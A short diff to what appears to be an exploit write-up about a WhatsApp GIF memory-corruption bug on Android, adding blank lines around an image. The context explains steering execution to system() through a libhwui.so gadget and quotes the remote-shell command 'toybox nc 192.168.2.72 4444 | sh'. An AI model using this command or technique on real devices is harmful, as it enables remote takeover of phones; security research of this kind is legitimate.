@@ -225,7 +225,9 @@ system("toybox nc 192.168.2.72 4444 | sh");
 For that, we need PC to point to `system()` function in libc.so and X0 to point to `"toybox nc 192.168.2.72 4444 | sh"`.
 This cannot be done directly. We need to first let PC jumps to an intermediate gadget, which sets X0 to point to `"toybox nc 192.168.2.72 4444 | sh"` and jump to `system()`.
 From the disassembly code around info->rewindFunction, we can see that both X0 and X19 point to info->rasterBits (or info, because they both point to the same location), while X8 is actually info->rewindFunction.
+
 ![Disassembly around info->rewindFunction](https://github.com/awakened1712/awakened1712.github.io/raw/master/assets/img/whatsapp1.PNG)
+
 There is a gadget in libhwui.so that perfectly satisfies our purpose:
 ```
 ldr x8, [x19, #0x18]
